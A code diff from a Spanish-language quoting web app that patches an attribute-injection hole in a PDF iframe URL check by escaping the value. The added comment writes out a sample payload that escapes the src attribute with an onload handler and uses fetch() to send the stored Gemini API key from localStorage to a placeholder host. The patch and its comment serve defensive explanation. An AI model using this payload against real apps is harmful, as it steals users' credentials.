@@ -6,7 +6,7 @@
    Es un script CLÁSICO, no un módulo ES, y el orden de carga lo fija cotizador.html. Los
    once archivos comparten el mismo ámbito global —como cuando eran un solo <script> en
    línea—, así que un `let` o una `function` de un archivo se ve desde los demás, y los
-   273 manejadores en línea del marcado (onclick, oninput…) siguen resolviendo contra ese
+   157 manejadores en línea del marcado (onclick, oninput…) siguen resolviendo contra ese
    ámbito. Portarlo a módulos ES los dejaría mudos en silencio: ver js/mod/cotizador.js.
 
    Hasta septiembre de 2026 todo esto vivía en línea dentro de cotizador.html, en un solo
@@ -75,10 +75,21 @@ function urlImagenSegura(u){
   return /^(data:image\/(png|jpe?g|svg\+xml|webp|gif);|blob:|logo-al3d)/i.test(v) ? esc(v) : '';
 }
 /* El archivo analizado también puede ser un PDF, que se enseña en un <iframe>: ahí un
-   javascript: sería peor todavía, porque corre en el origen de la app. */
+   javascript: sería peor todavía, porque corre en el origen de la app.
+
+   Y escapa, por la MISMA razón que su hermana de aquí arriba y con el mismo agujero: la
+   prueba es de PREFIJO, así que devolver el resto crudo dentro de src="${...}" dejaba salir
+        data:application/pdf;" onload="fetch('https://…?k='+localStorage.getItem('al3d_kxs_gemini'))
+   que pasa el filtro —empieza por data:application/pdf;— y se sale del atributo. Aquí es
+   PEOR que en el <img>: el <img> necesita que la imagen falle para disparar su onerror; el
+   <iframe> dispara `onload` solo, en cuanto se pinta. El camino de entrada es el de siempre
+   —`Q.aiFile` sale de AI_FILE_KEY, que está en RESPALDO_KEYS y llega en un respaldo
+   restaurado, que el README describe viajando por WhatsApp—.
+   Ni un data:, ni un blob: llevan comillas ni ángulos, así que escapar no cambia un solo
+   archivo bueno. */
 function urlPdfSegura(u){
   const v=String(u||'');
-  return /^(data:application\/pdf;|blob:)/i.test(v) ? v : '';
+  return /^(data:application\/pdf;|blob:)/i.test(v) ? esc(v) : '';
 }
 const locked=()=>Q.estado!=='borrador'&&!Q.editMode;
 /* Accesibilidad: hace que un chip clicable también responda a teclado (Enter/Espacio) */
